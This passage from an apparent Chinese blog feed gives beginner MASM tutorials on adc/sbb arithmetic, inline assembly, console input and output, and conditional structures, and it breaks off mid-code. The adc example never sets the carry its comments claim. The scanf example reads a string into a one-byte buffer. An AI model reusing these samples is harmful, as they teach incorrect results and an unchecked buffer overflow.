data-num="29"></td><td><pre>main ENDP</pre></td></tr><tr><td data-num="30"></td><td><pre>END main</pre></td></tr></table></figure><p><strong>运行测试</strong></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220204190942744.png" alt="image-20220204190942744" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220204190956972.png" alt="image-20220204190956972" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220204191014352.png" alt="image-20220204191014352" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220204191027968.png" alt="image-20220204191027968" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220204191044977.png" alt="image-20220204191044977" /></p>
<h1 id="扩展加减法"><a class="anchor" href="#扩展加减法">#</a> 扩展加减法</h1>
<h2 id="加法"><a class="anchor" href="#加法">#</a> 加法</h2>
<p>进位加法 adc：将原操作数与进位标志位的值和目的操作数都相加，使用格式与 ad 一样</p>
<p><strong>样例</strong></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">.586</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">.</span>MODEL flat<span class="token punctuation">,</span> stdcall</pre></td></tr><tr><td data-num="3"></td><td><pre>option casemap<span class="token operator">:</span>none</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>include windows<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="6"></td><td><pre>include user32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="7"></td><td><pre>include kernel32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="8"></td><td><pre>include msvcrt<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>includelib user32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="11"></td><td><pre>includelib kernel32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="12"></td><td><pre>includelib msvcrt<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">.</span>data</pre></td></tr><tr><td data-num="15"></td><td><pre></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token punctuation">.</span>code</pre></td></tr><tr><td data-num="17"></td><td><pre>main proc</pre></td></tr><tr><td data-num="18"></td><td><pre>    mov dl<span class="token punctuation">,</span><span class="token number">0</span></pre></td></tr><tr><td data-num="19"></td><td><pre>	mov al<span class="token punctuation">,</span><span class="token number">0FF</span>h<span class="token punctuation">;</span>al <span class="token operator">=</span> <span class="token number">11111111</span></pre></td></tr><tr><td data-num="20"></td><td><pre>	mov al<span class="token punctuation">,</span><span class="token number">0FF</span>h<span class="token punctuation">;</span>al <span class="token operator">=</span> <span class="token number">1111111</span> <span class="token operator">+</span> <span class="token number">1111111</span></pre></td></tr><tr><td data-num="21"></td><td><pre>	<span class="token punctuation">;</span>al <span class="token operator">=</span> <span class="token number">11111110</span> 进位标志位 <span class="token operator">=</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="22"></td><td><pre>	adc dl<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">;</span>dl <span class="token operator">=</span> <span class="token number">0</span> <span class="token operator">+</span> <span class="token number">0</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token operator">+</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="23"></td><td><pre>	<span class="token punctuation">;</span>dl <span class="token operator">=</span> <span class="token number">00000001</span></pre></td></tr><tr><td data-num="24"></td><td><pre>	push <span class="token number">0</span></pre></td></tr><tr><td data-num="25"></td><td><pre>	call ExitProcess</pre></td></tr><tr><td data-num="26"></td><td><pre>	add esp<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="27"></td><td><pre>main ENDP</pre></td></tr><tr><td data-num="28"></td><td><pre>END main</pre></td></tr></table></figure><p><strong>运行测试</strong></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220204191958729.png" alt="image-20220204191958729" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220204192010778.png" alt="image-20220204192010778" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220204192023777.png" alt="image-20220204192023777" /></p>
<h2 id="减法"><a class="anchor" href="#减法">#</a> 减法</h2>
<p>进位减法 sbb：从目的操作数减去原操作数和进位标志位的一个值</p>
<p>用 32 位操作数实现 64 位减法</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">.586</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">.</span>MODEL flat<span class="token punctuation">,</span> stdcall</pre></td></tr><tr><td data-num="3"></td><td><pre>option casemap<span class="token operator">:</span>none</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>include windows<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="6"></td><td><pre>include user32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="7"></td><td><pre>include kernel32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="8"></td><td><pre>include msvcrt<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>includelib user32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="11"></td><td><pre>includelib kernel32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="12"></td><td><pre>includelib msvcrt<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">.</span>data</pre></td></tr><tr><td data-num="15"></td><td><pre></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token punctuation">.</span>code</pre></td></tr><tr><td data-num="17"></td><td><pre>main proc</pre></td></tr><tr><td data-num="18"></td><td><pre>    mov edx<span class="token punctuation">,</span><span class="token number">7</span></pre></td></tr><tr><td data-num="19"></td><td><pre>	mov eax<span class="token punctuation">,</span><span class="token number">1</span></pre></td></tr><tr><td data-num="20"></td><td><pre>	sub eax<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">;</span><span class="token number">1</span> <span class="token operator">-</span> <span class="token number">2</span> <span class="token operator">=</span> ffffffff</pre></td></tr><tr><td data-num="21"></td><td><pre>	sbb edx<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token number">7</span> <span class="token operator">-</span> <span class="token number">0</span> <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">=</span> <span class="token number">6</span></pre></td></tr><tr><td data-num="22"></td><td><pre>	<span class="token punctuation">;</span><span class="token number">00000006ffff</span>ffff</pre></td></tr><tr><td data-num="23"></td><td><pre>	push <span class="token number">0</span></pre></td></tr><tr><td data-num="24"></td><td><pre>	call ExitProcess</pre></td></tr><tr><td data-num="25"></td><td><pre>	add esp<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="26"></td><td><pre>main ENDP</pre></td></tr><tr><td data-num="27"></td><td><pre>END main</pre></td></tr></table></figure><p><strong>运行测试</strong></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220204192742787.png" alt="image-20220204192742787" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220204192759183.png" alt="image-20220204192759183" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220204192811307.png" alt="image-20220204192811307" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220204192825110.png" alt="image-20220204192825110" /></p>
]]></content>
      <categories>
        <category>汇编语言</category>
      </categories>
      <tags>
        <tag>汇编语言</tag>
      </tags>
  </entry>
  <entry>
    <title>汇编语言之内联汇编解析</title>
    <url>/article/f2951c20.html</url>
    <content><![CDATA[<p>这么可爱的冰墩墩谁能不爱呢？</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220210201545182.png" alt="image-20220210201545182" /></p>
<p>-&gt; 新建项目</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220210193415741.png" alt="image-20220210193415741" /></p>
<p>-&gt; 新建项</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220210193623789.png" alt="image-20220210193623789" /></p>
<p>-&gt; 文件命名</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220210193734093.png" alt="image-20220210193734093" /></p>
<p>在 <code>main</code>  函数中使用内联汇编，通过 <code>_asm</code>  调用汇编</p>
<p><strong>单条指令</strong></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220210194134521.png" alt="image-20220210194134521" /></p>
<p><strong>多条指令</strong></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220210194448777.png" alt="image-20220210194448777" /></p>
<p>同时，内联汇编支持在 <code>_asm</code>  外定义变量</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220210194654674.png" alt="image-20220210194654674" /></p>
<p><strong>测试样例</strong></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>	<span class="token keyword">int</span> val <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span><span class="token comment">// 立即数</span></pre></td></tr><tr><td data-num="5"></td><td><pre>	_asm <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>			<span class="token comment">// 通过 mov 传送立即数</span></pre></td></tr><tr><td data-num="7"></td><td><pre>			mov ebx<span class="token punctuation">,</span>val</pre></td></tr><tr><td data-num="8"></td><td><pre>			mov ecx<span class="token punctuation">,</span>ebx</pre></td></tr><tr><td data-num="9"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token comment">// 还可通过 lea 传送字符串 lea esi,string</span></pre></td></tr></table></figure><p><strong>关于报错</strong></p>
<p>若运行失败，请检查运行库是否为 &quot;多线程调试&quot; 模式</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220210201317556.png" alt="image-20220210201317556" /></p>
<p>如此这期摸鱼就到此结束啦！</p>
<p>期待下次不可以这么摸鱼了 QAQ！！！</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220210201835162.png" alt="image-20220210201835162" /></p>
]]></content>
      <categories>
        <category>汇编语言</category>
      </categories>
      <tags>
        <tag>汇编语言</tag>
      </tags>
  </entry>
  <entry>
    <title>汇编语言之控制台程序的输入与输出</title>
    <url>/article/c3dea2a1.html</url>
    <content><![CDATA[<p>我们都知道在 C 语言中的输入输出中最常用的是 scanf 和 printf，其它的比如 gets 和 puts；而在 C++ 中的标准输入输出流一般用 cin 和 cout，那么汇编语言中的输入输出方式是什么样子的呢？接下来我们用 “Hello World!” 来进行学习。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/dfc8e658c198a318b1f053f430bc271.jpg" alt="image-dfc8e658c198a318b1f053f430bc271" /></p>
<p><strong>两种方式：</strong></p>
<ul>
<li>
<p>一种方式就是使用 API，类似于 MessageBox，然后直接写到控制台上</p>
</li>
<li>
<p>另一种是使用一个 MessageBox，来弹出一个消息框。</p>
</li>
</ul>
<h3 id="弹窗版的hello-world"><a class="anchor" href="#弹窗版的hello-world">#</a> 弹窗版的 Hello World!</h3>
<p><strong>定义弹窗的字符串</strong></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token punctuation">.</span>data</pre></td></tr><tr><td data-num="2"></td><td><pre>text db <span class="token string">"Hello World!"</span><span class="token punctuation">,</span><span class="token number">0</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token punctuation">;</span>定义弹窗的字符串</pre></td></tr></table></figure><p><strong>调用 MessageBox</strong></p>
<p>MessageBox 的四个参数</p>
<ol>
<li>句柄</li>
<li>内容</li>
<li>标题</li>
<li>按钮，比如：确定，取消之类</li>
</ol>
<p>按照从右往左的压参的方式</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token punctuation">;</span>调用MessageBox</pre></td></tr><tr><td data-num="2"></td><td><pre>push <span class="token number">0</span><span class="token punctuation">;</span>按钮</pre></td></tr><tr><td data-num="3"></td><td><pre>push offset text<span class="token punctuation">;</span>push 标题</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token punctuation">;</span>OFFSET是将数值回送变量或标号的偏移地址值<span class="token punctuation">.</span> </pre></td></tr><tr><td data-num="5"></td><td><pre>push offset text<span class="token punctuation">;</span>push 容</pre></td></tr><tr><td data-num="6"></td><td><pre>push <span class="token number">0</span><span class="token punctuation">;</span>push 句柄</pre></td></tr><tr><td data-num="7"></td><td><pre>call MessageBox<span class="token punctuation">;</span>完成调用</pre></td></tr></table></figure><p><strong>完整样例</strong></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">.586</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">.</span>MODEL flat<span class="token punctuation">,</span> stdcall</pre></td></tr><tr><td data-num="3"></td><td><pre>option casemap<span class="token operator">:</span>none</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>include windows<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="6"></td><td><pre>include user32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="7"></td><td><pre>include kernel32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre>includelib user32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="10"></td><td><pre>includelib kernel32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token punctuation">.</span>data</pre></td></tr><tr><td data-num="13"></td><td><pre>text db <span class="token string">"Hello World!"</span><span class="token punctuation">,</span><span class="token number">0</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">;</span>定义弹窗的字符串</pre></td></tr><tr><td data-num="15"></td><td><pre></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token punctuation">.</span>code</pre></td></tr><tr><td data-num="17"></td><td><pre>main proc</pre></td></tr><tr><td data-num="18"></td><td><pre>	<span class="token punctuation">;</span>调用MessageBox</pre></td></tr><tr><td data-num="19"></td><td><pre>	push <span class="token number">0</span><span class="token punctuation">;</span>按钮</pre></td></tr><tr><td data-num="20"></td><td><pre>	push offset text<span class="token punctuation">;</span>push 标题</pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token punctuation">;</span>OFFSET是将数值回送变量或标号的偏移地址值<span class="token punctuation">.</span> </pre></td></tr><tr><td data-num="22"></td><td><pre>	push offset text<span class="token punctuation">;</span>push 容</pre></td></tr><tr><td data-num="23"></td><td><pre>	push <span class="token number">0</span><span class="token punctuation">;</span>push 句柄</pre></td></tr><tr><td data-num="24"></td><td><pre>	call MessageBox<span class="token punctuation">;</span>完成调用</pre></td></tr><tr><td data-num="25"></td><td><pre>    <span class="token punctuation">;</span>堆栈进行防溢</pre></td></tr><tr><td data-num="26"></td><td><pre>	add esp<span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">;</span>四个参数，一个参数<span class="token number">32</span>位，四个<span class="token number">32</span>位的<span class="token number">4</span>个字节</pre></td></tr><tr><td data-num="27"></td><td><pre>	push <span class="token number">0</span></pre></td></tr><tr><td data-num="28"></td><td><pre>	call ExitProcess<span class="token punctuation">;</span>退出进程</pre></td></tr><tr><td data-num="29"></td><td><pre>	add esp<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="30"></td><td><pre>main ENDP</pre></td></tr><tr><td data-num="31"></td><td><pre>END main</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220121204413135.png" alt="image-20220121204413135" /></p>
<p><strong>运行结果</strong></p>
<p>可以看到按钮是 &quot;确定&quot;，然后标题和内容是 &quot;Hello World!&quot;</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220121202832394.png" alt="image-20220121202832394" /></p>
<h3 id="控制台输出hello-world"><a class="anchor" href="#控制台输出hello-world">#</a> 控制台输出 Hello World!</h3>
<p>在初级初级汇编中，因为我们都是在控制台上来写这个代码的，那么我们肯定就要知道怎么在控制台上来接收参数和写出东西；</p>
<p>那么其实呢，我们有两种方式</p>
<ul>
<li>一种是调用 MessageBox 类似的 API，写控制台，就是往控制台怎么写流的一个 API</li>
<li>另一种更便捷的方式，就是调用一个系统导出的 C 的库函数</li>
</ul>
<p>就是说如果直接调用一个 C 的库函数，我们就可以直接调用 printf 和 scanf，但只是调用方法不太一样，在调入之前，我们需要先给它包含一个头文件，因为我们这个 scanf 和 printf 其实都是在一个动态链接库里进行一个导出的，所以说呢，我们在使用之前呢，还是要把它这个头文件加进去</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>include msvcrt<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="2"></td><td><pre>includelib msvcrt<span class="token punctuation">.</span>lib</pre></td></tr></table></figure><p>包含完它的头文件和 lib 之后我们就可以正常使用了.</p>
<p><strong>调用 printf</strong></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>call crt_printf</pre></td></tr></table></figure><p><strong>完整样例</strong></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">.586</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">.</span>MODEL flat<span class="token punctuation">,</span> stdcall</pre></td></tr><tr><td data-num="3"></td><td><pre>option casemap<span class="token operator">:</span>none</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>include windows<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="6"></td><td><pre>include user32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="7"></td><td><pre>include kernel32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="8"></td><td><pre>include msvcrt<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>includelib user32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="11"></td><td><pre>includelib kernel32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="12"></td><td><pre>includelib msvcrt<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">.</span>data</pre></td></tr><tr><td data-num="15"></td><td><pre>text db <span class="token string">"Hello World!"</span><span class="token punctuation">,</span><span class="token number">0</span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token punctuation">;</span>定义弹窗的字符串</pre></td></tr><tr><td data-num="17"></td><td><pre></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token punctuation">.</span>code</pre></td></tr><tr><td data-num="19"></td><td><pre>main proc</pre></td></tr><tr><td data-num="20"></td><td><pre>	push offset text</pre></td></tr><tr><td data-num="21"></td><td><pre>	call crt_printf<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>	push <span class="token number">0</span></pre></td></tr><tr><td data-num="23"></td><td><pre>	call ExitProcess<span class="token punctuation">;</span>退出进程</pre></td></tr><tr><td data-num="24"></td><td><pre>	add esp<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">;</span>栈平</pre></td></tr><tr><td data-num="25"></td><td><pre>main ENDP</pre></td></tr><tr><td data-num="26"></td><td><pre>END main</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220121210512511.png" alt="image-20220121210512511" /></p>
<p><strong>运行结果</strong></p>
<p>可以看到 &quot;Hello World!&quot; 被打印出来了</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220121210417637.png" alt="image-20220121210417637" /></p>
<p>printf 的输出有了，那么 scanf 的输入如何在控制台上接收呢？</p>
<p><strong>scanf 的两个参数</strong></p>
<ul>
<li>字符串</li>
<li>取地址</li>
</ul>
<p>格式化字符串进行接收</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>format db <span class="token string">"%s"</span><span class="token punctuation">,</span><span class="token number">0</span></pre></td></tr></table></figure><p>然后我们需要传递两个参数进去</p>
<p>一个是需要用来容纳接收参数的一个字符串</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>text db <span class="token string">"Hello World!"</span><span class="token punctuation">;</span>已经初始化好了的字符串</pre></td></tr><tr><td data-num="2"></td><td><pre>text2 db <span class="token operator">?</span><span class="token punctuation">;</span>由系统进行初始化</pre></td></tr><tr><td data-num="3"></td><td><pre>text3 db <span class="token number">0</span><span class="token punctuation">;</span>自己初始化为零</pre></td></tr></table></figure><p><strong>调用 scanf 函数</strong></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>call crt_scanf</pre></td></tr></table></figure><p><strong>完整样例</strong></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">.586</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">.</span>MODEL flat<span class="token punctuation">,</span> stdcall</pre></td></tr><tr><td data-num="3"></td><td><pre>option casemap<span class="token operator">:</span>none</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>include windows<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="6"></td><td><pre>include user32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="7"></td><td><pre>include kernel32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="8"></td><td><pre>include msvcrt<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>includelib user32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="11"></td><td><pre>includelib kernel32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="12"></td><td><pre>includelib msvcrt<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">.</span>data</pre></td></tr><tr><td data-num="15"></td><td><pre>text db <span class="token string">"Hello World!"</span><span class="token punctuation">,</span><span class="token number">0</span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token punctuation">;</span>定义弹窗的字符串</pre></td></tr><tr><td data-num="17"></td><td><pre>text2 db <span class="token number">0</span></pre></td></tr><tr><td data-num="18"></td><td><pre>format db <span class="token string">"%s"</span><span class="token punctuation">,</span><span class="token number">0</span></pre></td></tr><tr><td data-num="19"></td><td><pre></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token punctuation">.</span>code</pre></td></tr><tr><td data-num="21"></td><td><pre>main proc</pre></td></tr><tr><td data-num="22"></td><td><pre>	push offset text2</pre></td></tr><tr><td data-num="23"></td><td><pre>	push offset format</pre></td></tr><tr><td data-num="24"></td><td><pre>	call crt_scanf</pre></td></tr><tr><td data-num="25"></td><td><pre>	add esp<span class="token punctuation">,</span><span class="token number">8</span></pre></td></tr><tr><td data-num="26"></td><td><pre>	push offset text2</pre></td></tr><tr><td data-num="27"></td><td><pre>	call crt_printf<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>	push <span class="token number">0</span></pre></td></tr><tr><td data-num="29"></td><td><pre>	call ExitProcess<span class="token punctuation">;</span>退出进程</pre></td></tr><tr><td data-num="30"></td><td><pre>	add esp<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="31"></td><td><pre>main ENDP</pre></td></tr><tr><td data-num="32"></td><td><pre>END main</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220121212310361.png" alt="image-20220121212310361" /></p>
<p><strong>运行结果</strong></p>
<p>可以看到接收完之后又打印出来了</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220121212110261.png" alt="image-20220121212110261" /></p>
<p>如此使用 scanf 和 printf 的输入输出就实现了</p>
]]></content>
      <categories>
        <category>汇编语言</category>
      </categories>
      <tags>
        <tag>汇编语言</tag>
      </tags>
  </entry>
  <entry>
    <title>汇编语言之条件结构与条件控制流伪指令学习</title>
    <url>/article/189db1b1.html</url>
    <content><![CDATA[<h2 id="条件结构"><a class="anchor" href="#条件结构">#</a> 条件结构</h2>
<p>条件结构在 C 语言中分为</p>
<ul>
<li>顺序结构</li>
<li>选择结构</li>
<li>循环结构</li>
</ul>
<p>三大类，下面通过汇编语言模拟实现</p>
<h3 id="选择结构"><a class="anchor" href="#选择结构">#</a> 选择结构</h3>
<p>利用汇编语言模拟 <code>if else</code>  语句</p>
<p>模拟语句</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span>o1 <span class="token operator">==</span> o2<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    x <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    y <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    x <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    y <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>汇编语言实现</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">.586</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">.</span>MODEL flat<span class="token punctuation">,</span> stdcall</pre></td></tr><tr><td data-num="3"></td><td><pre>option casemap<span class="token operator">:</span>none</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>include windows<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="6"></td><td><pre>include user32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="7"></td><td><pre>include kernel32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="8"></td><td><pre>include msvcrt<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>includelib user32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="11"></td><td><pre>includelib kernel32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="12"></td><td><pre>includelib msvcrt<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">.</span>data</pre></td></tr><tr><td data-num="15"></td><td><pre>o1 dword <span class="token number">100</span></pre></td></tr><tr><td data-num="16"></td><td><pre>o2 dword <span class="token number">100</span></pre></td></tr><tr><td data-num="17"></td><td><pre>x dword <span class="token operator">?</span></pre></td></tr><tr><td data-num="18"></td><td><pre>y dword <span class="token operator">?</span></pre></td></tr><tr><td data-num="19"></td><td><pre></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token punctuation">.</span>code</pre></td></tr><tr><td data-num="21"></td><td><pre>main proc</pre></td></tr><tr><td data-num="22"></td><td><pre>	mov eax<span class="token punctuation">,</span>o1</pre></td></tr><tr><td data-num="23"></td><td><pre>	cmp eax<span class="token punctuation">,</span>o2</pre></td></tr><tr><td data-num="24"></td><td><pre>	jnz lp<span class="token 